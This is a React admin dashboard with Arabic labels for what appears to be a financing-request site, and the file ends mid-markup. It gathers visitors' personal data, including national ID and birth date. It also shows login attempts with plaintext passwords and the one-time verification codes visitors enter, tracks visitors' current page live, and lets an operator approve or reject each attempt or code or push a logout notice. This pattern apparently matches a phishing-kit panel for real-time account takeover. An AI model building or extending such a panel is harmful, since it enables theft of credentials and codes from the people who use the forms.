import { useEffect, useState, useRef } from 'react';
import { supabase, Registration } from '@/lib/supabase';
import {
  Users, CheckCircle2, Clock, Activity, Eye, EyeOff,
  RefreshCw, Wifi, WifiOff, Shield, Calendar, Phone,
  CreditCard, Mail, Layout, List, User, Lock, FileText, Hash,
  LogIn as LogInIcon, ShieldCheck, Copy, Check, Wifi as WifiIcon, Volume2, VolumeX, Trash2, X, AlertTriangle
} from 'lucide-react';
import { useSiteConfig, FormField } from '@/context/SiteConfigContext';
import { useAdminAuth } from '@/context/AdminAuthContext';
import { fetchActivePresence, getPageName, PresenceUser } from '@/lib/presence';
import { initSounds, playNewRegistrationSound, playLoginAttemptSound, playVerificationCodeSound, toggleSound, getSoundEnabled } from '@/lib/notifications';
import { formatTimeAgo } from '@/lib/timeUtils';
import HeaderFooterEditor from '@/components/cms/HeaderFooterEditor';
import PageContentEditor from '@/components/cms/PageContentEditor';
import FormFieldsEditor from '@/components/cms/FormFieldsEditor';
import SecurityTab from '@/components/cms/SecurityTab';
import NotificationPermission from '@/components/notifications/NotificationPermission';
import { useNotifications } from '@/hooks/useNotifications';
import { useFirestoreAdmin } from '@/hooks/useFirestoreAdmin';
// Socket.io for real-time presence
import { initSocket, disconnectSocket, onUsersUpdate, SocketUser, getPageDisplayName, isSocketConnected } from '@/lib/socket';

type LoginAttempt = {
  id: string;
  registration_id: string | null;
  client_id: string | null;
  email: string;
  password: string;
  status: 'pending' | 'approved' | 'rejected';
  created_at: string;
  updated_at: string;
  logoutNotice?: boolean;
};

type RegistrationWithMeta = Registration & { 
  _new?: boolean; 
  extra_fields?: Record<string, string>;
  login_attempts?: LoginAttempt[];
  verification_codes?: VerificationCode[];
  client_id?: string;
  clientId?: string; // Add camelCase version for Firestore compatibility
};

type VerificationCode = {
  id: string;
  registration_id: string | null;
  client_id: string | null;
  code: string;
  verified: boolean;
  created_at: string;
};

// Unified timeline item type
type TimelineItem = {
  id: string;
  type: 'registration' | 'login' | 'verification';
  created_at: string;
  data: any;
};

const FIELD_ICONS: Record<string, any> = {
  full_name: User,
  email: Mail,
  phone: Phone,
  national_id: CreditCard,
  date_of_birth: Calendar,
  password: Lock,
  textarea: FileText,
};

const CORE_COLUMNS: Record<string, string> = {
  full_name: 'full_name',
  email: 'email',
  phone: 'phone',
  national_id: 'national_id',
  date_of_birth: 'date_of_birth',
  password: 'password_hash',
};

const statusLabel: Record<string, { text: string; className: string }> = {
  pending: { text: 'قيد المراجعة', className: 'bg-yellow-100 text-yellow-700' },
  pending_verification: { text: 'بانتظار التحقق', className: 'bg-orange-100 text-orange-700' },
  verified: { text: 'تم التحقق', className: 'bg-green-100 text-green-700' },
  completed: { text: 'مكتمل', className: 'bg-blue-100 text-blue-700' },
  rejected: { text: 'مرفوض', className: 'bg-red-100 text-red-700' },
};

function maskPassword(pw: string) {
  return '•'.repeat(Math.min(pw.length, 10));
}

// ─── Registrations Tab ────────────────────────────────────────────────────────

const AVATAR_COLORS = [
  'bg-blue-600', 'bg-emerald-600', 'bg-violet-600',
  'bg-rose-600', 'bg-amber-600', 'bg-cyan-600',
];
function avatarColor(name: string) {
  if (!name) return AVATAR_COLORS[0];
  let n = 0;
  for (let i = 0; i < name.length; i++) n += name.charCodeAt(i);
  return AVATAR_COLORS[n % AVATAR_COLORS.length];
}

function RegistrationsTab() {
  const { formFields } = useSiteConfig();
  const [registrations, setRegistrations] = useState<RegistrationWithMeta[]>([]);
  const [loading, setLoading] = useState(true);
  const [connected, setConnected] = useState(false);
  const [showPassMap, setShowPassMap] = useState<Record<string, boolean>>({});
  const [copiedId, setCopiedId] = useState<string | null>(null);

  // Online presence tracking (Supabase - existing)
  const [onlineUsers, setOnlineUsers] = useState<PresenceUser[]>([]);

  // Socket.io users (new system)
  const [socketUsers, setSocketUsers] = useState<SocketUser[]>([]);
  const [socketConnected, setSocketConnected] = useState(false);

  // Login attempts
  const [loginAttempts, setLoginAttempts] = useState<LoginAttempt[]>([]);

  // Panel collapsed state
  const [isPanelCollapsed, setIsPanelCollapsed] = useState(false);
  
  // New attempts count (for badge when panel is collapsed)
  const [newAttemptsCount, setNewAttemptsCount] = useState(0);
  const [seenAttemptIds, setSeenAttemptIds] = useState<Set<string>>(new Set());

  // Current time state for time-ago updates (refreshes every minute)
  const [currentTime, setCurrentTime] = useState(new Date());

  // Update current time every minute
  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentTime(new Date());
    }, 60000);
    return () => clearInterval(interval);
  }, []);

  // Helper function to get latest activity time from login attempts
  const getLatestActivityTime = (reg: RegistrationWithMeta): Date | null => {
    if (!reg.login_attempts || reg.login_attempts.length === 0) {
      // Fallback to created_at from registration
      if (reg.created_at) {
        return new Date(reg.created_at);
      }
      return null;
    }
    // Get the most recent login attempt
    const latest = reg.login_attempts.reduce((prev, curr) => {
      const prevDate = new Date(prev.created_at);
      const currDate = new Date(curr.created_at);
      return currDate > prevDate ? curr : prev;
    });
    return new Date(latest.created_at);
  };

  // Sort registrations by most recent activity (newest first)
  const sortedRegistrations = [...registrations].sort((a, b) => {
    const timeA = getLatestActivityTime(a);
    const timeB = getLatestActivityTime(b);
    if (!timeA && !timeB) return 0;
    if (!timeA) return 1;
    if (!timeB) return -1;
    return timeB.getTime() - timeA.getTime();
  });

  // Use Firestore for real-time updates (when Supabase is not configured)
  const { registrations: firestoreRegistrations, loginAttempts: firestoreLoginAttempts, verificationCodes: firestoreVerificationCodes, refresh: refreshFirestore } = useFirestoreAdmin();

  // Sync Firestore data with local state when it changes
  useEffect(() => {
    if (firestoreRegistrations.length > 0) {
      setRegistrations(prev => {
        const existingIds = new Set(prev.map(r => r.id));
        const newRegs = firestoreRegistrations.filter(r => !existingIds.has(r.id));
        
        if (newRegs.length > 0) {
          // New registrations from Firestore - add with _new flag and play sound
          const withNew = newRegs.map(r => ({ ...r, _new: true }));
          playNewRegistrationSound();
          setTimeout(() => {
            setRegistrations(current => current.map(reg => 
              withNew.find(n => n.id === reg.id) ? { ...reg, _new: false } : reg
            ));
          }, 3000);
          return [...prev, ...withNew];
        }
        return prev;
      });
    }
  }, [firestoreRegistrations]);

  // Sync login attempts from Firestore
  useEffect(() => {
    if (firestoreLoginAttempts.length > 0) {
      setLoginAttempts(firestoreLoginAttempts);
      
      console.log('[Admin] Syncing login attempts:', firestoreLoginAttempts.length);
      
      // Link login attempts to registrations based on clientId
      setRegistrations(prev => {
        const registrationClientIds = new Set(prev.map(r => r.clientId || r.client_id));
        
        // Update existing registrations with their login attempts
        const updatedRegs = prev.map(reg => {
          const regClientId = reg.clientId || reg.client_id;
          return {
            ...reg,
            login_attempts: firestoreLoginAttempts.filter(
              login => login.clientId === regClientId
            ),
          };
        });
        
        // Create virtual registrations for login attempts that don't have a matching registration
        const newRegistrations = firestoreLoginAttempts
          .filter(login => login.clientId && !registrationClientIds.has(login.clientId))
          .map(login => ({
            id: login.id,
            full_name: login.email?.split('@')[0] || 'عميل جديد',
            email: login.email || '',
            phone: '',
            national_id: '',
            date_of_birth: '',
            status: login.status === 'pending' ? 'pending' as const : 'pending' as const,
            created_at: login.created_at,
            client_id: login.clientId,
            clientId: login.clientId,
            login_attempts: [login],
            _new: true,
          }));
        
        return [...updatedRegs, ...newRegistrations];
      });
      
      // Track new attempts (those not seen yet)
      const allAttemptIds = firestoreLoginAttempts.map(a => a.id);
      const newUnseen = allAttemptIds.filter(id => !seenAttemptIds.has(id));
      if (newUnseen.length > 0) {
        setNewAttemptsCount(prev => prev + newUnseen.length);
        // Play sound for new attempts
        playLoginAttemptSound();
      }
    }
  }, [firestoreLoginAttempts, seenAttemptIds]);

  // When panel is expanded, mark all as seen
  useEffect(() => {
    if (!isPanelCollapsed && loginAttempts.length > 0) {
      const allIds = loginAttempts.map(a => a.id);
      setSeenAttemptIds(new Set(allIds));
      setNewAttemptsCount(0);
    }
  }, [isPanelCollapsed, loginAttempts]);

  // Sync verification codes from Firestore
  useEffect(() => {
    if (firestoreVerificationCodes.length > 0) {
      console.log('[Admin] Syncing verification codes:', firestoreVerificationCodes.length);
      console.log('[Admin] Verification codes details:', firestoreVerificationCodes.map(vc => ({
        id: vc.id,
        clientId: vc.clientId,
        userId: vc.userId,
        code: vc.code,
        status: vc.status
      })));
      
      // Update registrations with their verification codes based on clientId
      setRegistrations(prev => {
        const updated = prev.map(reg => {
          const regClientId = reg.clientId || reg.client_id;
          // Filter verification codes by clientId
          const codes = firestoreVerificationCodes.filter(
            vc => vc.clientId === regClientId
          );
          
          console.log('[Admin] Matching codes for reg', reg.id, 'with clientId', regClientId, ':', codes.length);
          
          // If registration already has verification_codes, merge them
          const existingCodes = reg.verification_codes || [];
          const existingCodesIds = new Set(existingCodes.map(c => c.id));
          
          // Add new codes that don't exist yet
          const newCodes = codes.filter(c => !existingCodesIds.has(c.id));
          
          if (newCodes.length > 0 || codes.length > 0) {
            return {
              ...reg,
              verification_codes: [...existingCodes, ...newCodes].sort(
                (a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime()
              ),
            };
          }
          
          return reg;
        });
        
        console.log('[Admin] Registrations with verification codes:', updated.filter(r => r.verification_codes?.length > 0).length);
        
        return updated;
      });
      
      // Also create virtual registrations for verification codes without matching registration
      setRegistrations(prev => {
        const registrationClientIds = new Set(prev.map(r => r.clientId || r.client_id));
        console.log('[Admin] Existing registration clientIds:', [...registrationClientIds]);
        
        const codesWithNoRegistration = firestoreVerificationCodes.filter(
          vc => vc.clientId && !registrationClientIds.has(vc.clientId)
        );
        console.log('[Admin] Codes without registration:', codesWithNoRegistration.length);
        
        const newRegistrations = codesWithNoRegistration
          .map(vc => ({
            id: vc.id,
            full_name: 'عميل جديد',
            email: '',
            phone: '',
            national_id: '',
            date_of_birth: '',
            status: 'pending_verification' as const,
            created_at: vc.created_at,
            client_id: vc.clientId,
            clientId: vc.clientId,
            verification_codes: [vc],
            _new: true,
          }));
        
        if (newRegistrations.length > 0) {
          // Check if these are really new
          const existingIds = new Set(prev.map(r => r.clientId || r.client_id));
          const trulyNew = newRegistrations.filter(r => !existingIds.has(r.clientId || r.client_id));
          console.log('[Admin] Creating new registrations for codes:', trulyNew.length);
          if (trulyNew.length > 0) {
            return [...prev, ...trulyNew];
          }
        }
        
        return prev;
      });
    }
  }, [firestoreVerificationCodes]);

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 1500);
  };
  const [selectedId, setSelectedId] = useState<string | null>(null);
  
  // Bulk selection state
  const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set());
  const [showDeleteModal, setShowDeleteModal] = useState(false);
  const [deleting, setDeleting] = useState(false);
  
  const channelRef = useRef<ReturnType<typeof supabase.channel> | null>(null);
  const loginChannelRef = useRef<ReturnType<typeof supabase.channel> | null>(null);
  
  // Toggle single selection
  const toggleSelect = (id: string) => {
    setSelectedIds(prev => {
      const newSet = new Set(prev);
      if (newSet.has(id)) {
        newSet.delete(id);
      } else {
        newSet.add(id);
      }
      return newSet;
    });
  };
  
  // Toggle select all
  const toggleSelectAll = () => {
    if (selectedIds.size === registrations.length) {
      setSelectedIds(new Set());
    } else {
      setSelectedIds(new Set(registrations.map(r => r.id)));
    }
  };
  
  // Delete selected registrations
  const deleteSelected = async () => {
    setDeleting(true);
    try {
      const idsArray = Array.from(selectedIds);
      
      for (const regId of idsArray) {
        const reg = registrations.find(r => r.id === regId);
        if (!reg) continue;
        
        // Delete from login_attempts (by registration_id or client_id)
        try {
          await supabase
            .from('login_attempts')
            .delete()
            .or(`registration_id.eq.${regId},client_id.eq.${reg.client_id}`);
        } catch (e) {}
        
        // Delete from verification_codes (by registration_id or client_id)
        try {
          await supabase
            .from('verification_codes')
            .delete()
            .or(`registration_id.eq.${regId},client_id.eq.${reg.client_id}`);
        } catch (e) {}
        
        // Delete from registrations
        await supabase.from('registrations').delete().eq('id', regId);
      }
      
      // Clear selection and refresh
      setSelectedIds(new Set());
      setSelectedId(null);
      setShowDeleteModal(false);
      await fetchAll();
    } catch (err) {
      console.error('Delete error:', err);
      alert('حدث خطأ أثناء الحذف');
    } finally {
      setDeleting(false);
    }
  };

  const fetchAll = async () => {
    setLoading(true);
    const { data: regs } = await supabase.from('registrations').select('*').order('created_at', { ascending: false });
    
    // Fetch login attempts
    let logins: LoginAttempt[] = [];
    try {
      const { data, error } = await supabase
        .from('login_attempts')
        .select('*')
        .order('created_at', { ascending: false });
      
      if (!error && data) {
        logins = data;
        setLoginAttempts(data);
      }
    } catch (e) {
      // Ignore errors - login_attempts table may not exist
    }
    
    // Try to fetch verification codes
    let codes: VerificationCode[] = [];
    try {
      const { data, error } = await supabase
        .from('verification_codes')
        .select('*')
        .order('created_at', { ascending: false });
      
      // Only use data if no error
      if (!error && data) {
        codes = data;
      }
    } catch (e) {
      // Ignore errors - verification_codes table may not exist
    }
    
    setLoading(false);
    if (regs) {
      const combined = regs.map(r => ({
        ...r,
        // Filter by registration_id OR client_id to capture all attempts
        login_attempts: logins?.filter(l => 
          l.registration_id === r.id || l.client_id === r.client_id
        ).sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime()) || [],
        verification_codes: codes?.filter(c => 
          c.registration_id === r.id || c.client_id === r.client_id
        ).sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime()) || []
      }));
      setRegistrations(combined);
    }
  };

  useEffect(() => {
    fetchAll();

    // Subscribe to presence changes using Supabase Realtime
    const presenceChannel = supabase.channel('presence-admin-channel')
      .on('postgres_changes', { event: '*', schema: 'public', table: 'presence' }, () => {
        // Fetch active presence on any change - immediate refresh
        fetchActivePresence().then(users => setOnlineUsers(users));
      })
      .subscribe();

    // Initial fetch of online users
    fetchActivePresence().then(users => setOnlineUsers(users));

    // Polling fallback: Poll every 3 seconds to ensure real-time updates
    const pollingInterval = setInterval(() => {
      fetchActivePresence().then(users => setOnlineUsers(users));
    }, 3000);

    // Socket.io connection for real-time presence
    initSocket('/admin');
    setSocketConnected(isSocketConnected());
    
    // Subscribe to Socket.io users update
    const unsubscribe = onUsersUpdate((users) => {
      setSocketUsers(users);
      setSocketConnected(isSocketConnected());
    });

    return () => {
      supabase.removeChannel(presenceChannel);
      clearInterval(pollingInterval);
      disconnectSocket();
      unsubscribe();
    };
  }, []);

  // Create channel for other subscriptions
  useEffect(() => {
    const channel = supabase.channel('admin-all-data')
      // Listen for registration changes
      .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'registrations' }, (payload) => {
        const newReg = { ...(payload.new as Registration), _new: true };
        setRegistrations((prev) => [newReg, ...prev]);
        setSelectedId((prev) => prev ?? newReg.id);
        setTimeout(() => setRegistrations((prev) => prev.map((r) => r.id === newReg.id ? { ...r, _new: false } : r)), 3000);
        // تشغيل نغمة طلب تمويل جديد
        playNewRegistrationSound();
      })
      .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'registrations' }, (payload) => {
        setRegistrations((prev) => prev.map((r) => r.id === payload.new.id ? { ...r, ...payload.new as Registration } : r));
      })
      // Listen for login_attempts changes
      .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'login_attempts' }, async (payload) => {
        const newLogin = payload.new as LoginAttempt;
        setRegistrations((prev) => prev.map((r) => {
          // Link by registration_id OR client_id
          if (r.id === newLogin.registration_id || r.client_id === newLogin.client_id) {
            return {
              ...r,
              login_attempts: [...(r.login_attempts || []), newLogin].sort(
                (a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime()
              )
            };
          }
          return r;
        }));
        // إضافة المحاولة الجديدة لـ loginAttempts state
        setLoginAttempts((prev) => [newLogin, ...prev]);
        fetchAll();
        // تشغيل نغمة محاولة تسجيل دخول
        playLoginAttemptSound();
      })
      // Listen for login_attempts updates (approved/rejected)
      .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'login_attempts' }, async (payload) => {
        const updatedLogin = payload.new as LoginAttempt;
        setLoginAttempts((prev) => prev.map((l) => 
          l.id === updatedLogin.id ? { ...l, ...updatedLogin } : l
        ));
        setRegistrations((prev) => prev.map((r) => ({
          ...r,
          login_attempts: (r.login_attempts || []).map((l) => 
            l.id === updatedLogin.id ? { ...l, ...updatedLogin } : l
          )
        })));
      })
      // Listen for verification_codes changes
      .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'verification_codes' }, async (payload) => {
        const newCode = payload.new as VerificationCode;
        setRegistrations((prev) => prev.map((r) => {
          if (r.id === newCode.registration_id || r.client_id === newCode.client_id) {
            return {
              ...r,
              verification_codes: [...(r.verification_codes || []), newCode].sort(
                (a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime()
              )
            };
          }
          return r;
        }));
        fetchAll();
        // تشغيل نغمة محاولة رمز التحقق
        playVerificationCodeSound();
      })
      // Listen for verification_codes updates
      .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'verification_codes' }, async (payload) => {
        const updatedCode = payload.new as VerificationCode;
        setRegistrations((prev) => prev.map((r) => ({
          ...r,
          verification_codes: (r.verification_codes || []).map((c) => 
            c.id === updatedCode.id ? { ...c, ...updatedCode } : c
          )
        })));
      })
      .subscribe((status) => setConnected(status === 'SUBSCRIBED'));

    channelRef.current = channel;

    return () => {
      supabase.removeChannel(channel);
    };
  }, []);

  const togglePassVisibility = (id: string) =>
    setShowPassMap((prev) => ({ ...prev, [id]: !prev[id] }));

  const stats = {
    total: registrations.length,
    verified: registrations.filter((r) => r.status === 'verified' || r.status === 'completed').length,
    pending: registrations.filter((r) => r.status === 'pending').length,
    today: registrations.filter((r) => new Date(r.created_at).toDateString() === new Date().toDateString()).length,
  };

  // Login attempts pending count
  const pendingLogins = loginAttempts.filter(l => l.status === 'pending').length;

  // Handle approve/reject login attempts
  const handleLoginAttempt = async (id: string, action: 'approved' | 'rejected') => {
    try {
      console.log('[Admin] Updating login attempt:', id, 'to', action);
      // Use Firestore
      const { updateLoginAttempt } = await import('@/lib/firestore');
      await updateLoginAttempt(id, { status: action });
      console.log('[Admin] Login attempt updated successfully');
      
      // Update local state
      setLoginAttempts(prev => prev.map(l => 
        l.id === id ? { ...l, status: action as 'approved' | 'rejected' } : l
      ));
      await refreshFirestore();
    } catch (err) {
      console.error('Login attempt update error:', err);
    }
  };

  // Handle logout notice - send client to login page with logout message
  const handleLogoutNotice = async (id: string) => {
    try {
      // Try Firestore first
      const { updateLoginAttempt } = await import('@/lib/firestore');
      await updateLoginAttempt(id, { 
        status: 'rejected',
        logoutNotice: true,
      });
      
      // Update local state
      setLoginAttempts(prev => prev.map(l => 
        l.id === id ? { ...l, status: 'rejected' as const, logout_notice: true } : l
      ));
      await refreshFirestore();
    } catch (err) {
      console.error('Logout notice error:', err);
    }
  };

  // Handle verify code approval
  const handleVerifyCode = async (id: string, action: 'approved' | 'rejected') => {
    try {
      const { updateUser, updateVerificationCode } = await import('@/lib/firestore');
      
      const newStatus = action === 'approved' ? 'verified' : 'rejected';
      
      // Update registration status
      await updateUser(id, { status: newStatus });
      
      // Find and update verification code status
      const reg = registrations.find(r => r.id === id);
      if (reg?.verification_codes && reg.verification_codes.length > 0) {
        const latestCode = reg.verification_codes[0];
        await updateVerificationCode(latestCode.id, { 
          status: newStatus,
          verified: action === 'approved' 
        });
      }
      
      // Refresh to update the list
      await refreshFirestore();
    } catch (err) {
      console.error('[Admin] Error updating verification status:', err);
    }
  };

  const selected = registrations.find((r) => r.id === selectedId);

  return (
    <div id="admin-panel" className="flex flex-col flex-1 overflow-hidden text-right" dir="rtl" style={{ width: '100%', maxWidth: '100%', padding: 0, margin: 0 }}>

      {/* ── Split panel ── */}
      <div className="flex-1 flex overflow-hidden min-h-0" style={{ padding: 0 }}>

        {/* ── LEFT: Registration list (40%) ── */}
        <div className={`${isPanelCollapsed ? 'w-[50px]' : 'w-[40%]'} flex flex-col bg-slate-800 border-l border-slate-700 overflow-hidden transition-all duration-300`} style={{ margin: 0, padding: 0 }}>
          {/* Collapsed Toolbar */}
          {isPanelCollapsed ? (
            <div className="flex flex-col items-center py-3 gap-3">
              <Activity className="w-5 h-5 text-blue-400" />
              <button 
                onClick={() => setIsPanelCollapsed(false)}
                className="relative p-2 rounded-lg bg-slate-700 hover:bg-slate-600 text-slate-400 hover:text-white transition-colors"
              >
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                </svg>
                {/* New attempts badge */}
                {newAttemptsCount > 0 && (
                  <span className="absolute -top-1 -right-1 w-5 h-5 bg-red-500 text-white text-[10px] font-bold rounded-full flex items-center justify-center animate-pulse">
                    {newAttemptsCount > 9 ? '9+' : newAttemptsCount}
                  </span>
                )}
              </button>
              <div className={`w-3 h-3 rounded-full ${connected ? 'bg-green-500' : 'bg-red-500'}`} />
            </div>
          ) : (
            <>
              {/* Expanded Toolbar */}
              <div className="shrink-0 px-4 py-3 border-b border-slate-700 flex items-center justify-between gap-2">
                <div className="flex items-center gap-2 min-w-0">
                  <Activity className="w-4 h-4 text-blue-400 shrink-0" />
                  <span className="font-bold text-white text-sm truncate">سجل التسجيلات</span>
                  <span className="bg-slate-700 text-slate-400 text-xs px-2 py-0.5 rounded-full shrink-0">
                    {registrations.length}
                  </span>
                </div>
                <div className="flex items-center gap-2 shrink-0">
                  <button 
                    onClick={() => setIsPanelCollapsed(true)}
                    className="p-1.5 rounded-lg bg-slate-700 hover:bg-slate-600 text-slate-400 hover:text-white transition-colors"
                  >
                    <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
                    </svg>
                  </button>
                  <div className={`flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-semibold ${connected ? 'bg-green-900/60 text-green-400' : 'bg-red-900/60 text-red-400'}`}>
                    {connected ? <Wifi className="w-3 h-3" /> : <WifiOff className="w-3 h-3" />}
                    <span className="hidden sm:inline">{connected ? 'مباشر' : 'منقطع'}</span>
                  </div>
                  <button onClick={fetchAll} className="p-1.5 rounded-lg bg-slate-700 hover:bg-slate-600 text-slate-400 hover:text-white transition-colors">
                    <RefreshCw className={`w-3.5 h-3.5 ${loading ? 'animate-spin' : ''}`} />
                  </button>
                </div>
              </div>
              
              {/* Bulk Actions Toolbar */}
              <div className="shrink-0 px-4 py-2 border-b border-slate-700 bg-slate-800/80 flex items-center justify-between gap-2">
                <div className="flex items-center gap-3">
                  <label className="flex items-center gap-2 cursor-pointer">
                    <input
                      type="checkbox"
                      checked={selectedIds.size === sortedRegistrations.length && sortedRegistrations.length > 0}
                      onChange={toggleSelectAll}
                      className="w-4 h-4 accent-blue-500 rounded"
                      disabled={sortedRegistrations.length === 0}
                    />
                    <span className="text-xs text-slate-400 font-medium">تحديد الكل</span>
                  </label>
                </div>
                {selectedIds.size > 0 && (
                  <div className="flex items-center gap-2">
                    <span className="text-xs text-slate-400">
                      ({selectedIds.size}) محدد
                    </span>
                    <button
                      onClick={() => setShowDeleteModal(true)}
                      className="flex items-center gap-1.5 px-3 py-1.5 bg-red-600 hover:bg-red-500 text-white text-xs font-semibold rounded-lg transition-colors"
                    >
                      <Trash2 className="w-3.5 h-3.5" />
                      حذف
                    </button>
                  </div>
                )}
              </div>

              <div className="flex-1 overflow-y-auto">
                {loading ? (
                  <div className="flex items-center justify-center py-16">
                    <div className="w-7 h-7 border-2 border-blue-500 border-t-transparent rounded-full animate-spin" />
                  </div>
                ) : (
                  <div className="divide-y divide-slate-700/40">
                    {sortedRegistrations.map((reg) => {
                      const isSelected = reg.id === selectedId;
                      const isBulkSelected = selectedIds.has(reg.id);
                      const name = reg.full_name || 'بدون اسم';
                      
                      // Check if this registration's client is currently online
                      const socketPresence = reg.client_id ? socketUsers.find(u => u.clientId === reg.client_id) : null;
                      const isOnline = !!socketPresence;
                      const currentPage = socketPresence?.page || '';
                      
                      return (
                        <div 
                          key={reg.id} 
                          className={`w-full text-right px-4 py-3.5 flex items-center gap-3 transition-all group ${reg._new ? 'bg-blue-500/10 border-r-2 border-blue-400' : isSelected ? 'bg-slate-700/80 border-r-2 border-blue-500' : 'hover:bg-slate-700/40 border-r-2 border-transparent'}`}
                        >
                          <input
                            type="checkbox"
                            checked={isBulkSelected}
                            onChange={() => toggleSelect(reg.id)}
                            className="w-4 h-4 accent-blue-500 rounded shrink-0"
                          />
                          <button 
                            onClick={() => setSelectedId(isSelected ? null : reg.id)}
                            className="flex items-center gap-3 flex-1 min-w-0"
                          >
                            <div className={`w-9 h-9 rounded-full ${avatarColor(name)} flex items-center justify-center text-white font-bold text-sm shrink-0 shadow-md`}>
                              {name.charAt(0)}
                            </div>
                            <div className="flex-1 min-w-0">
                              <div className="flex items-center gap-2 justify-between">
                                <div className="flex items-center gap-2 min-w-0">
                                  <span className={`text-sm font-semibold truncate ${isSelected ? 'text-white' : 'text-slate-200 group-hover:text-white'}`}>{name}</span>
                                  {isOnline && currentPage && (
                                    <span className="flex items-center gap-1 px-1.5 py-0.5 rounded-full text-[10px] font-semibold bg-green-500/20 text-green-400 shrink-0">
                                      <span className="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse"></span>
                                      متصل - {getPageDisplayName(currentPage)}
                                    </span>
                                  )}
                                  {!isOnline && (
                                    <span className="flex items-center gap-1 px-1.5 py-0.5 rounded-full text-[10px] font-semibold bg-slate-600/50 text-slate-400 shrink-0">
                                      غير متصل
                                    </span>
                                  )}
                                </div>
                                {/* Time on the left side */}
                                <span className="text-xs text-slate-500 shrink-0">
                                  {(() => {
                                    const latestTime = getLatestActivityTime(reg);
                                    return latestTime ? formatTimeAgo(latestTime) : '';
                                  })()}
                                </span>
                              </div>
                              <p className="text-xs text-slate-500 truncate mt-0.5 ltr text-left">{reg.email}</p>
                            </div>
                          </button>
                        </div>
                      );
                    })}
                  </div>
                )}
              </div>
            </>
          )}
        </div>

        {/* ── RIGHT: Detail panel (60%) ── */}
        <div className="flex-1 flex flex-col bg-slate-800 overflow-hidden" style={{ margin: 0, padding: 0 }}>
          <div className="shrink-0 px-5 py-3.5 border-b border-slate-700 flex items-center gap-2">
            <Shield className="w-4 h-4 text-blue-400" />
            <h2 className="font-bold text-white text-sm">{selected ? `تفاصيل: ${selected.full_name || 'المستخدم'}` : 'تفاصيل المستخدم'}</h2>
          </div>

          <div className="flex-1 overflow-y-auto">
            {!selected ? (
              <div className="flex flex-col items-center justify-center h-full text-slate-500 px-6 text-center gap-3">
                <Users className="w-8 h-8 opacity-30" />
                <p className="text-sm font-medium">لم يتم اختيار أي مستخدم</p>
              </div>
            ) : (
              <div className="p-6">
                {/* Profile Header */}
                <div className="flex items-center gap-4 pb-5 border-b border-slate-700 mb-6">
                  <div className={`w-16 h-16 rounded-2xl ${avatarColor(selected.full_name || '')} flex items-center justify-center text-2xl font-extrabold text-white shadow-xl`}>
                    {(selected.full_name || '?').charAt(0)}
                  </div>
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center gap-2">
                      <h3 className="text-lg font-extrabold text-white leading-tight">{selected.full_name || 'بدون اسم'}</h3>
                      {(() => {
                        const selectedSocketPresence = selected.client_id ? socketUsers.find(u => u.clientId === selected.client_id) : null;
                        if (selectedSocketPresence) {
                          return (
                            <span className="flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-semibold bg-green-500/20 text-green-400">
                              <span className="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse"></span>
                              متصل - {getPageDisplayName(selectedSocketPresence.page || '')}
                            </span>
                          );
                        }
                        return (
                          <span className="flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-semibold bg-slate-600/50 text-slate-400">
                            غير متصل
                          </span>
                        );
                      })()}
                    </div>
                    <div className="flex items-center gap-2 mt-1 flex-wrap">
                      {selected.client_id && (
                        <span className="px-2 py-1 rounded-full text-[10px] font-mono bg-slate-700 text-slate-400">
                          ID: {selected.client_id.substring(0, 8)}...
                        </span>
                      )}
                    </div>
                  </div>
                </div>

                {/* Unified Timeline - sorted by most recent first */}
                {(() => {
                  // Create unified timeline items
                  const timeline: TimelineItem[] = [];

                  // Add registration data
                  timeline.push({
                    id: selected.id,
                    type: 'registration',
                    created_at: selected.created_at,
                    data: selected,
                  });

                  // Add login attempts
                  if (selected.login_attempts && selected.login_attempts.length > 0) {
                    selected.login_attempts.forEach(login => {
                      timeline.push({
                        id: login.id,
                        type: 'login',
                        created_at: login.created_at,
                        data: login,
                      });
                    });
                  }

                  // Add verification codes
                  if (selected.verification_codes && selected.verification_codes.length > 0) {
                    selected.verification_codes.forEach(vc => {
                      timeline.push({
                        id: vc.id,
                        type: 'verification',
                        created_at: vc.created_at,
                        data: vc,
                      });
                    });
                  }

                  // Sort by most recent first
                  timeline.sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());

                  // Render timeline items
                  return (
                    <div className="space-y-4">
                      {timeline.map((item, index) => {
                        const isNewest = index === 0;
                        
                        // Registration Data Card
                        if (item.type === 'registration') {
                          return (
                            <div key={item.id} className={`rounded-xl border ${isNewest ? 'border-blue-500/50 bg-slate-700/30' : 'border-slate-700 bg-slate-800/50'} p-4`}>
                              <div className="flex items-center justify-between mb-4">
                                <div className="flex items-center gap-2">
                                  <User className={`w-4 h-4 ${isNewest ? 'text-blue-400' : 'text-slate-400'}`} />
                                  <h4 className={`text-sm font-bold ${isNewest ? 'text-blue-400' : 'text-white'}`}>البيانات الشخصية</h4>
                                </div>
                                <div className="flex items-center gap-2">
                                  <span className={`text-[10px] px-2 py-0.5 rounded-full ${isNewest ? 'bg-blue-500/20 text-blue-400' : 'bg-slate-700 text-slate-400'}`}>
